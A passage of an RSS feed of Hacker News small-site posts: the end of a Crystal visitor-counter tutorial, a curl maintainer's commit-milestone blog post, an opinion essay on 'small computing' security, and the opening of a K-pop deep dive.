2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520context.request.path.not_nil!%2520!%253D%2520%2522%252F%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520call_next(context)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip_address%2520%253D%2520extract_ip(context.request)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520unless%2520ip_address.nil%253F%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520increase_total_visits(ip_address)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520increase_unique_visits(ip_address)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520image%2520%253D%2520ImageGenerator.generate(%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520get_total_visits()%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520get_unique_visits()%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.content_type%2520%253D%2520%2522image%252Fpng%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.content_length%2520%253D%2520image.size%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520IO.copy(image%252C%2520context.response)%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520increase_total_visits(ip)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(TOTAL_VISITS_KEY).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520increase_unique_visits(ip)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2540redis.exists(ip)%2520%253D%253D%25200%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.set(ip%252C%25201)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(UNIQUE_VISITS_KEY).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520get_unique_visits%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(%2540redis.get(UNIQUE_VISITS_KEY)%2520%257C%257C%2520%25220%2522).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520get_total_visits%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(%2540redis.get(TOTAL_VISITS_KEY)%2520%257C%257C%2520%25220%2522).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520end%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--35-.png" alt="carbon--35-"></a></p>
<!--kg-card-end: markdown--><p>The main file code should look like this right now:</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=require%2520%2522stumpy_png%2522%250Arequire%2520%2522http%252Fserver%2522%250Arequire%2520%2522http%252Fserver%252Fhandlers%252F*%2522%250Arequire%2520%2522redis%2522%250A%250Arequire%2520%2522.%252Fvisitor_counter%252F*%2522%250A%250Ainclude%2520StumpyPNG%250A%250Amodule%2520VisitorCounter%250A%2520%2520VERSION%2520%253D%2520%25220.1.0%2522%250A%250A%2520%2520ENV%255B%2522PORT%2522%255D%2520%257C%257C%253D%2520%25228080%2522%250A%2520%2520ENV%255B%2522REDIS_URL%2522%255D%2520%257C%257C%253D%2520%2522redis%253A%252F%252F127.0.0.1%252F%2522%250A%250A%2520%2520redis%2520%253D%2520Redis%253A%253APooledClient.new(url%253A%2520ENV%255B%2522REDIS_URL%2522%255D)%250A%250A%2520%2520server%2520%253D%2520HTTP%253A%253AServer.new(%255B%250A%2520%2520%2520%2520HTTP%253A%253AErrorHandler.new%252C%250A%2520%2520%2520%2520HTTP%253A%253ALogHandler.new%252C%250A%2520%2520%2520%2520HTTP%253A%253ACompressHandler.new%252C%250A%2520%2520%2520%2520VisitorCounter%253A%253AWebHandler.new(redis)%252C%250A%2520%2520%255D)%250A%250A%2520%2520address%2520%253D%2520server.bind_tcp%2520%25220.0.0.0%2522%252CENV%255B%2522PORT%2522%255D.to_i%250A%2520%2520puts%2520%2522Listening%2520on%2520http%253A%252F%252F%2523%257Baddress%257D%2522%250A%2520%2520server.listen%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--31-.png" alt="carbon--31-"></a></p>
<!--kg-card-end: markdown--><p>Running the main code now we should see the counter working as expected:</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-80.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-80.png 600w, https://www.techprowd.com/content/images/2020/09/image-80.png 801w"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-79.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-79.png 600w, https://www.techprowd.com/content/images/2020/09/image-79.png 612w"></figure><p>Notice the response times of the web request! It's around 1ms per request! That's crazy fast... But wait, it's not built correctly.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-81.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-81.png 600w, https://www.techprowd.com/content/images/2020/09/image-81.png 829w"></figure><p>Now that's what I call FAST!</p><figure><img src="https://www.techprowd.com/content/images/2020/09/source-1.gif" alt=""></figure><p>Just one issue... While running Apache benchmarks, I noticed that the total visit counter is increasing at every request, which is right, but it can be easily abused. We need to rate-limit the total visit counter so that a single IP address can have only one visit per X amount of time.</p><p>Easy, he said! Remember, we are using Redis for our storage, and Redis has a Keys with Expiration feature. Which is precisely what we need.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=private%2520def%2520increase_total_visits(ip)%250A%2520%2520%2520%2520if%2520%2540redis.exists(%2522!%2523%257Bip%257D%2522)%2520%253D%253D%25200%250A%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(TOTAL_VISITS_KEY).to_i%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.set(%2522!%2523%257Bip%257D%2522%252C%25201%252C%2520RATE_LIMIT_SECONDS)%250A%2520%2520%2520%2520end%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--37-.png" alt="carbon--37-"></a></p>
<!--kg-card-end: markdown--><p>This way now only increases total visits only when the rate limit timeout will be reached; in this code, it's 5 seconds, but I am going to set something like 1 minute in production.</p><p>Now that we have our application working as we expect. We should deploy our application. I am going to follow the official <a href="https://crystal-lang.org/2016/05/26/heroku-buildpack.html">Crystal guide for Heroku deployment</a>.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-82.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-82.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-82.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-82.png 1600w, https://www.techprowd.com/content/images/2020/09/image-82.png 1676w" sizes="(min-width: 1200px) 1200px"></figure><p>After easy set up and install now we have an working counter running on heroku.</p><p><a href="https://immense-beyond-23382.herokuapp.com/">https://immense-beyond-23382.herokuapp.com/</a></p><!--kg-card-begin: html--><p><img src="https://immense-beyond-23382.herokuapp.com/"></p><!--kg-card-end: html--><h2 id="conclusion">Conclusion</h2><p>The fully working source code is available on my <a href="https://www.patreon.com/posts/41771991">Patreon account</a> for all pledgers. I will try to add this small counter to this Ghost template as I really loved the idea of this small counter 15 years ago.</p><p>Don't forget to subscribe to the newsletters down bellow. Every new article will be delivered in a friendly email, readable format straight into your mailbox!</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to techprowd</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>
            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.techprowd.com/evening-project-a-crystal-based-super-fast-visitor-counter/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525873</guid>
            <pubDate>Sat, 19 Sep 2020 07:43:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My first 15000 curl commits]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525665">thread link</a>) | @dosshell
<br/>
September 18, 2020 | https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I’ve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl’s git repository</a> – and we don’t do merge commits so this number doesn’t include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can’t count</a> and shows a marginally lower number.</p>



<figure><img loading="lazy" width="844" height="116" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png 844w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-450x62.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-200x27.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-768x106.png 768w" sizes="(max-width: 844px) 100vw, 844px"></figure>



<p>This is of course a totally meaningless number and I’m only mentioning it here because it’s even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#daniel-vs-rest"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I’ve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of “curl time” per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren’t included in this commit number. For example, I have done over 4,400 commits in curl’s website repository.</p>



<p>With these my first 15,000 commits I’ve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to “modern times”, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I’ve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more “oops” commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#authors"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#coreteam-per-year"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl’s top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I’ve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won’t start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I’m present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There’s a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>



<figure><a href="https://twitter.com/bagder/status/1302345161272418307"><img loading="lazy" width="825" height="493" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png 825w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-450x269.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-200x120.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-768x459.png 768w" sizes="(max-width: 825px) 100vw, 825px"></a></figure>



<p>I showed these results to my wife. She approved.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525665</guid>
            <pubDate>Sat, 19 Sep 2020 06:43:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Small Computing and the Security Mindset]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525475">thread link</a>) | @zdw
<br/>
September 18, 2020 | http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html | <a href="https://web.archive.org/web/*/http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<header>

</header>
<section data-field="subtitle">
The story of modern computing is the story of the big-computing mindset (scale, centralization, elitism, and paternalism) infecting…
</section>
<section data-field="body">
<section name="3648"><div><div><h3 name="8f02" id="8f02">Small Computing and the Security&nbsp;Mindset</h3><p name="3181" id="3181">The story of modern computing is the story of the big-computing mindset (scale, centralization, elitism, and paternalism) infecting everything it touches as programming becomes more of a profession than a craft. In the process, it creates edifices of practices — useful in big-computing situations — that get unthinkingly applied outside of their appropriate bounds, forcing small-computing projects into the strictures of big-computing design. One major domain where we must begin to think critically about the big- vs small-computing distinction is security.</p><p name="46d1" id="46d1">Small-computing systems ought to be secure. After all, they are our most personal environments! They are our diaries and our artworks and our dream journals! But computer security, as it has become professionalized, has become more and more focused on big-computing environments, and good security practices in those environments are inimical to the basic tenets of small computing.</p><p name="369b" id="369b">In a big-computing environment, valuable secrets (like credit card numbers) and desirable powers (like the ability to tweet on behalf of the president) are kept on a set of machines owned by a single entity (the corporation) on behalf of the ostensible owners of that information and power (particular end-users) and protected from illegitimate access (hacking/cracking) by an elite set of professionals (software engineers, ops teams, security consultants) who use their monopoly on legitimate access to certain power (superuser &amp; administrator privileges, commit access) to construct laws (security policies) that prohibit as many not-explicitly-allowed operations as possible. Because the adversaries are many, with infinite time and energy, and because the treasure is valuable, and because laws always have unseen loopholes, these elite professionals construct layers upon layers of rules to limit not only what users (legitimate or illegitimate) can do, but what kind of feedback they can receive.</p><p name="c145" id="c145">This mentality has even made its way into language design: Java (and C++) have a rudimentary form of access control where members can be marked private, and good style in these languages is to mark all member data as private and write accessor functions, ostensibly in order to perform validity checks on proposed modification. This boilerplate is added rather than doing the sensible thing and creating custom metatables such that assignments are implicitly passed through an integrity check (as may be done in Python and Lua). Of course, such checks are rarely implemented, and they cannot distinguish between ‘authorized’ and ‘unauthorized’ calling-classes anyhow — while C++ has ‘friend classes’ that can modify private data directly, and both support using inheritance hierarchies to control data access, there is no granularity smaller than kin/friend versus outsider, so these access controls are borderline useless for everything besides the ad-hoc plugging failures of the type system and increasing the line count of codebases.</p><p name="c4c2" id="c4c2">Systems that require big-computing style security exist. Problems that are best suited to those systems also exist — your bank ought to not only have big-computing style security, but ought to have substantially better security than it has. But, this model is not really sensible in many of the places it is used. For instance, Google Docs (which simulates a word processor with some limited support for simultaneous editing by multiple users) is locked into this model only because it is client-server, and a hypothetical local-first or peer-to-peer version should not be so professionalized and stratified; Microsoft Word, being a local application, has no legitimate excuse (though the real reason, as with most big-computing systems, is that unnecessary centralization is a very effective way to squeeze money out of users who don’t know any better).</p><p name="d95a" id="d95a">When I use Google Docs, I can modify the javascript running on my browser, modify the cookies being sent to the server, and modify URL parameters. If I do something wrong, I will get an entirely unhelpful error message from inside the black box of the remote server. This is because, by failing to fall precisely in line with the Alphabet Corporation’s desired behavior, I have become an adversary, and adversaries cannot be given information that might help them do whatever they might want to do (since some of the things they might want to do is get, for instance, the credit card numbers of everyone who has ever bought an advertisement). Of course, Google engineers writing and maintaining Google Docs face the same situation. Outside of an adversarial situation, investigating a poorly-understood piece of code by poking it and interpreting error messages is called debugging, and part of the small computing ethos is that users should not be prevented from debugging.</p><p name="05d7" id="05d7">The difference between big computing and small computing is, in essence, that in small computing, the user is never an adversary. This is because the running code is owned and controlled by the user. This goes beyond open source / free software (where the developer is no adversary, but the developer is an elite professional often working on behalf of a corporation inside a firewall, performing work that may well be detrimental to those who actually need to interact with its effects).</p><p name="bd41" id="bd41">What kinds of structures befit a small-computing system in an environment where networking exists, and what security models are appropriate for these structures?</p><p name="8df4" id="8df4">For one thing, a multi-user client-server model makes no sense. In a client-server model, whoever controls the single server functionally controls all clients. There is, therefore, incentive to hoard power by locking vital functionalities away on the shared server, making every client dependent — slowed by latency when online, shit out of luck when offline, and always under threat of sudden unilateral changes in policy or protocol.</p><p name="d853" id="d853">Instead, we should look to peer to peer systems: direct for real-time communication, and offline-first store-and-forward schemes for everything else. Asymmetric encryption for key exchange and for signing still make sense here, as does hash-based content addressing for storage. Secure Scuttlebutt and IPFS are good models for what small-computing-oriented network technologies of the future might look like: fully distributed, yet resistant to the kinds of threats that regularly take down federated systems like ActivityPub and IRC, because all nodes are equal and all nodes replicate for each other (under cryptographically-enforced anti-spoofing measures).</p><p name="32c0" id="32c0">What does a threat model for small-computing infrastructure look like?</p><p name="2535" id="2535">Well, unlike in big-computing systems, a small-computing system does not (typically) have large numbers of highly motivated dedicated attackers. Fuzzy Bear isn’t APTing your grandma’s laptop, because your grandma’s laptop has nothing on it but christmas MIDIs and questionable nudes. Our threat is really from folks doing large-scale automated sweeps for low-hanging fruit. So, small-computing threat modeling looks like everyday opsec: use encryption, don’t give strangers direct access to private spaces and limit the spaces they do have access to, distinguish between sensitive and non-sensitive data, and protect the integrity of the system from outsiders. Protect the network-facing portion of your machine, while maximizing your own access to it.</p><p name="aa5a" id="aa5a">In this context, technologies we absolutely do not need are: passwords, SSO, certificate authority hierarchies, name servers and host files, NAT firewalls, code signing, chroot jails, memory layout randomizers, executable symbol stripping, single-application containers, daemons running as ‘nobody’, web APIs for wrapping the web APIs around your web APIs, friend classes, and sudo.</p><p name="9477" id="9477">Technologies we might want to look into: distributed hash tables, chord routing, merkel trees, functional languages, JIT, fast copy-on-write, network-aware cache eviction policies, split-brain countermeasures, transitive blocking, store and forward, message passing, microversioning, journaling, and image-based environments.</p></div></div></section>
</section>
</article></div>]]>
            </description>
            <link>http://www.lord-enki.net/medium-backup/2020-09-18_Small-Computing-and-the-Security-Mindset-821dfb512aa7.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525475</guid>
            <pubDate>Sat, 19 Sep 2020 05:54:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hand-Optimizing VLIW Assembly Language as a Game]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24525372">thread link</a>) | @luu
<br/>
September 18, 2020 | http://silverspaceship.com/hovalaag/ | <a href="https://web.archive.org/web/*/http://silverspaceship.com/hovalaag/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://silverspaceship.com/hovalaag/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24525372</guid>
            <pubDate>Sat, 19 Sep 2020 05:27:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Deep Dive into K-pop]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24525108">thread link</a>) | @eswat
<br/>
September 18, 2020 | https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/ | <a href="https://web.archive.org/web/*/https://dormin.org/2020/09/06/a-deep-dive-into-k-pop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-719">

	
	<!-- .entry-header -->


			<div>

			<p><img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/8dedad4c-ee57-46fd-91a2-32cbb9a652d1/d97l7vh-b56d2b05-419a-4aa2-90c9-1f7a87db1968.jpg/v1/fill/w_1024,h_725,q_75,strp/my_first_kpop_collage_by_rainbowcandleofjoy_d97l7vh-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzI1IiwicGF0aCI6IlwvZlwvOGRlZGFkNGMtZWU1Ny00NmZkLTkxYTItMzJjYmI5YTY1MmQxXC9kOTdsN3ZoLWI1NmQyYjA1LTQxOWEtNGFhMi05MGM5LTFmN2E4N2RiMTk2OC5qcGciLCJ3aWR0aCI6Ijw9MTAyNCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.Py2kzajyzSvCd5CFWXNFSOW5m_rgR6UJMXllQj3dy18" alt="KPOP Collections: Kpop Groups Collage"></p>
<p>Prior to last month, I knew next to nothing about K-pop (Korean popular music) besides having heard a few songs in passing and the rumors of the industry’s infamous elements, most notably a string of high profile suicides over the last few years. As an American with no connection to music or South Korean culture, I wondered if I was getting an accurate picture of the industry or if I was being misled by the most lurid and morbid elements eagerly conveyed by the media.</p>
<p>So I decided to do a deep dive down the internet rabbit hole of K-pop to understand what it is, how it works, and what I think about it. For anything that’s not my personal opinion or that goes beyond basic historical knowledge, I’ll cite my sources, which are a mixture of news articles, academic articles, YouTube videos, and some content aggregators like Wikipedia and Statista. I welcome any corrections or criticisms on inaccurate sources or things I didn’t understand.</p>
<p>I’ll warn you upfront – this essay is over 30,000 words long. It is the largest post I have made on dormin.org besides my novel. Since I sympathize with anyone who doesn’t want to make such a large time investment into a subject of passing curiosity, I will present my key findings here divided between the five <strong>parts</strong> of the essay. If you’re not sure if you want to read everything, you can jump to any individual part and understand it without reading the other sections.</p>

<h3><a href="#Basics"><strong><u>Part 1</u> – <u>The Basics</u></strong></a></h3>
<ul>
<li>“K-pop” is both a genre of music and an entire industry which “manufacturers” performers and their performance output (music, dance routines, shows, merchandise, etc.) in a highly systematized top-down manner</li>
<li>The global popularity of K-pop is extraordinary considering the relatively small population of South Korea, and the relatively small size of K-pop production companies</li>
</ul>
<h3><a href="#Product"><strong><u>Part 2</u> – <u>The Product</u></strong></a></h3>
<ul>
<li>K-pop’s industrial/corporate structure represents a Korean (and East-Asian) cultural alternative to Western pop and broader music production</li>
<li>K-pop stars and bands are manufactured and controlled by production companies in the same manner Western athletes are trained and traded by sports teams.</li>
<li>K-pop stars are crafted into idealized portrays of individuals by East Asian cultural standards</li>
</ul>
<h3><a href="#Fans"><strong><u>Part 3</u> – <u>The Fans</u></strong></a></h3>
<ul>
<li>K-pop fandom is both more intense on average than Western fandom, and has a larger percentage of unhealthily obsessive fans</li>
<li>K-pop fandom is based on a parasocial relationship between fans and stars</li>
